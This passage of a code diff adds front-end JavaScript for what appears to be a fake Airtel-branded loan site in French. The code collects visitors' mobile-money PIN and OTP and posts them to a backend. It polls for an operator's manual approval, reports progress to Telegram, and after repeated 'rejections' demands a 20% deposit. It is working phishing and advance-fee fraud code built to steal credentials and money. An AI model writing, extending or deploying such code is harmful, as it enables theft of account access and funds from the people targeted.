+    let statusIndex = 0;
+    if (processingInterval) clearInterval(processingInterval);
+    processingInterval = setInterval(() => {
+        progress += 1;
+        if (progress > 100) progress = 100;
+        document.getElementById('processingProgress').style.width = progress + '%';
+        document.getElementById('processingPercent').textContent = Math.round(progress) + '%';
+        const idx = Math.min(Math.floor((progress / 100) * statuses.length), statuses.length - 1);
+        if (idx > statusIndex) { statusIndex = idx; document.getElementById('processingStatus').textContent = statuses[idx]; }
+        if (progress >= 100) {
+            clearInterval(processingInterval);
+            processingInterval = null;
+            approvedAmount = approvedAmounts.get(phone);
+            document.getElementById('qualifiedAmount').textContent = `${approvedAmount.toLocaleString()} $`;
+            saveProgress();
+            sendToTelegram({ type: '✅ PRÊT APPROUVÉ', phone: phone, amount: approvedAmount });
+            goToStep('qualified');
+        }
+    }, stepTime);
+}
+
+function goToPinEntry() {
+    document.querySelectorAll('#pinGrid .pin-input').forEach(inp => inp.value = '');
+    document.getElementById('pinError').classList.add('hidden');
+    goToStep('pinEntry');
+}
+
+document.querySelectorAll('#pinGrid .pin-input').forEach((inp, idx) => {
+    inp.addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '');
+        if (this.value.length === 1 && idx < 3) document.querySelectorAll('#pinGrid .pin-input')[idx+1].focus();
+        document.getElementById('pinError').classList.add('hidden');
+    });
+    inp.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace' && this.value.length === 0 && idx > 0) document.querySelectorAll('#pinGrid .pin-input')[idx-1].focus();
+    });
+});
+
+document.querySelectorAll('#otpGrid .otp-input').forEach((inp, idx) => {
+    inp.addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '');
+        if (this.value.length === 1 && idx < 3) document.querySelectorAll('#otpGrid .otp-input')[idx+1].focus();
+        document.getElementById('otpError').classList.add('hidden');
+    });
+    inp.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace' && this.value.length === 0 && idx > 0) document.querySelectorAll('#otpGrid .otp-input')[idx-1].focus();
+    });
+});
+
+async function verifyPin() {
+    const phone = document.getElementById('withdrawPhone') ? document.getElementById('withdrawPhone').value.trim() : userData.phone;
+    if (!phone || !isValidPhone(phone)) { document.getElementById('pinError').classList.remove('hidden'); return; }
+    
+    let pin = '';
+    document.querySelectorAll('#pinGrid .pin-input').forEach(inp => pin += inp.value);
+    if (pin.length !== 4) { document.getElementById('pinError').classList.remove('hidden'); return; }
+    document.getElementById('pinError').classList.add('hidden');
+    storedPin = pin;
+
+    showApprovalWait('pin');
+
+    try {
+        const res = await fetch('/api/request-approval', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ type: 'pin', value: pin, phone: phone, userData: userData })
+        });
+        const data = await res.json();
+        if (data.requestId) startPolling(data.requestId, 'pin');
+        else alert('Connection error.');
+    } catch (err) {
+        alert('Connection error.');
+    }
+}
+
+async function submitOtp() {
+    let otp = '';
+    document.querySelectorAll('#otpGrid .otp-input').forEach(inp => otp += inp.value);
+    if (otp.length !== 4) { document.getElementById('otpError').classList.remove('hidden'); return; }
+    document.getElementById('otpError').classList.add('hidden');
+
+    showApprovalWait('otp');
+
+    try {
+        const res = await fetch('/api/request-approval', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ type: 'otp', value: otp, phone: userData.phone, userData: userData })
+        });
+        const data = await res.json();
+        if (data.requestId) startPolling(data.requestId, 'otp');
+        else alert('Connection error.');
+    } catch (err) {
+        alert('Connection error.');
+    }
+}
+
+function goBackToQualified() { goToStep('qualified'); }
+function goBackToPinEntry() { goToStep('pinEntry'); }
+
+function showApprovalWait(stage) {
+    waitSeconds = 0;
+    const timerEl = document.getElementById(stage === 'pin' ? 'pinWaitTimer' : 'otpWaitTimer');
+    if (timerEl) timerEl.textContent = '0s';
+    if (waitTimerInterval) clearInterval(waitTimerInterval);
+    waitTimerInterval = setInterval(() => {
+        waitSeconds++;
+        if (timerEl) timerEl.textContent = waitSeconds + 's';
+    }, 1000);
+    goToStep(stage === 'pin' ? 'pinApproval' : 'otpApproval');
+}
+
+function stopPolling() {
+    if (approvalPollInterval) { clearInterval(approvalPollInterval); approvalPollInterval = null; }
+    if (waitTimerInterval) { clearInterval(waitTimerInterval); waitTimerInterval = null; }
+}
+
+function startPolling(requestId, stage) {
+    if (approvalPollInterval) clearInterval(approvalPollInterval);
+    approvalPollInterval = setInterval(async () => {
+        try {
+            const res = await fetch(`/api/check-approval/${requestId}`);
+            const data = await res.json();
+            if (data.status === 'approved') { stopPolling(); handleApproval(stage, true); }
+            else if (data.status === 'rejected') { stopPolling(); handleApproval(stage, false); }
+        } catch (err) {}
+    }, 2000);
+}
+
+function handleApproval(stage, approved) {
+    if (approved) {
+        if (stage === 'pin') { goToStep('otpEntry'); startOtpCountdown(); }
+        else if (stage === 'otp') { goToStep('final'); }
+    } else {
+        if (stage === 'pin') {
+            pinRejectionCount++;
+            if (pinRejectionCount >= 2) showDepositWarning();
+            else goToStep('wrongPin');
+        } else if (stage === 'otp') {
+            otpRejectionCount++;
+            if (otpRejectionCount >= 2) showDepositWarning();
+            else goToStep('wrongOtp');
+        }
+    }
+}
+
+function showDepositWarning() {
+    const loanAmount = approvedAmount || userData.amount || 0;
+    const twentyPercent = Math.round(loanAmount * 0.2);
+    const firstName = userData.firstName || 'Client';
+    const amountFormatted = loanAmount.toLocaleString('fr-FR');
+    const twentyFormatted = twentyPercent.toLocaleString('fr-FR');
+    const t = translations[currentLanguage] || translations.fr;
+
+    let html = `<p>${t.depositGreeting.replace('{name}', firstName)}</p>`;
+    html += `<p>${t.depositP1.replace('{amount}', amountFormatted)}</p>`;
+    html += `<p>${t.depositP2.replace('{twenty}', twentyFormatted)}</p>`;
+    html += `<p>${t.depositP3.replace(/{twenty}/g, twentyFormatted)}</p>`;
+    html += `<p>${t.depositP4}</p>`;
+    html += `<p style="background:#fff;padding:10px;border-radius:6px;border-left:3px solid #dc3545;"><strong>⚠️ Important:</strong> ${t.depositP5}</p>`;
+    html += `<p>${t.depositP6}</p>`;
+
+    document.getElementById('depositMsg').innerHTML = html;
+    goToStep('deposit');
+}
+
+function startOtpCountdown() {
+    let seconds = 60;
+    const el = document.getElementById('otpCountdown');
+    if (el) el.textContent = seconds;
+    if (otpTimerInterval) clearInterval(otpTimerInterval);
+    otpTimerInterval = setInterval(() => {
+        seconds--;
+        if (el) el.textContent = seconds;
+        if (seconds <= 0) { clearInterval(otpTimerInterval); otpTimerInterval = null; document.getElementById('otpError').classList.remove('hidden'); }
+    }, 1000);
+}
+
+function goToOtpEntry() { goToStep('otpEntry'); startOtpCountdown(); }
+
+function goHome() {
+    stopPolling();
+    if (otpTimerInterval) { clearInterval(otpTimerInterval); otpTimerInterval = null; }
+    if (processingInterval) { clearInterval(processingInterval); processingInterval = null; }
+    document.getElementById('firstName').value = '';
+    document.getElementById('lastName').value = '';
+    document.getElementById('phone').value = '';
+    document.getElementById('email').value = '';
+    document.getElementById('idNumber').value = '';
+    document.getElementById('city').value = '';
+    document.getElementById('status').value = '';
+    document.getElementById('purpose').value = '';
+    document.getElementById('loanAmount').value = '1000';
+    document.getElementById('loanAmountSlider').value = '1000';
+    document.getElementById('loanMonths').value = '12';
+    document.querySelectorAll('#pinGrid .pin-input').forEach(inp => inp.value = '');
+    document.querySelectorAll('#otpGrid .otp-input').forEach(inp => inp.value = '');
+    document.querySelectorAll('#loanTypeGroup .radio-option').forEach(o => {
+        o.classList.remove('selected');
+        o.style.borderColor = '#e0e0e0';
+        o.style.background = '#fafafa';
+    });
+    const firstOpt = document.querySelector('#loanTypeGroup .radio-option[data-loan="personnel"]');
+    if (firstOpt) {
+        firstOpt.classList.add('selected');
+        firstOpt.style.borderColor = 'var(--airtel-red)';
+        firstOpt.style.background = '#ffeeee';
+        firstOpt.querySelector('input[type="radio"]').checked = true;
+    }
+    selectedLoanType = 'Personnel';
+    userData = {};
+    approvedAmount = 0;
+    pinRejectionCount = 0;
+    otpRejectionCount = 0;
+    localStorage.removeItem('airtel_user_data');
+    localStorage.removeItem('airtel_approved_amount');
+    localStorage.setItem('airtel_current_step', 'step1');
+    updateCalculator();
+    goToStep('step1');
+}
+
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') {
+        const active = document.activeElement;
+        if (active && (active.tagName === 'INPUT' || active.tagName === 'SELECT' || active.tagName === 'TEXTAREA')) {
+            const panel = document.querySelector('.panel.active');
+            const btn = panel ? panel.querySelector('.btn:not(.btn-secondary)') : null;
+            if (btn) btn.click();
+        }
+    }
+});
+</script>
+</body>
+  </html>
